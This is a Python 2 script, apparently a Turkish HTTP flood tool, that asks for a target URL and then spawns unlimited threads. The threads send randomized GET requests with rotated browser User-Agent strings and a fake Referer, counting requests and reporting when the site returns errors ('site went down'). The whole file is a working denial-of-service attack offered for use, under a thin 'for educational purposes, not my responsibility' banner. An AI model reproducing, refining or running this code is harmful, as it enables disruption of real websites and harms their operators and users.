# encoding:utf-8
import os
import sys
import urllib2
import threading
import random
from banner import access

########################################           # # # # #            #########            #########            #########
#     Egitim amaclıdır.                                                     #            #       #                #                 #            #                 #                     #
########################################           # ##                    #                 #            #                 #                     #
#      Islemlerden ben sorumlu degilim.                   #           #       #                 #                 #            #                 #                     #
########################################           #          #              #########            #########                     #

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

access.asciibanner()
print ("\033[1;32m")
url = raw_input("          URL GIR:  ").strip()
print ("\033[1;m")

count = 0
headers = []
referer = {
    "https://www.google.com/",
    "https://www.lcwaikiki.com/"
}


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
    headers.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                #print ("\033[1;32m Attacking Website \033[1;m")
                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                #req = urllib2.Request(url)
                req.add_header("User-Agent", random.choice(useragent()))
                #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                req.add_header("User-Agent", "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
                req.add_header("Referer", referer)
                urllib2.urlopen(req)
                count += 1
                print ("{0} Paket Gonderildi.".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m SITE DUSTU. \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m URL HATASI. \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m [-]URLNIZI KONTROL EDIN. \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-]KULLANICI TARAFINDAN IPTAL EDILDI. \033[1;m")
                sys.exit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-]KULLANICI TARAFINDAN IPTAL EDILDI. \033[1;m")
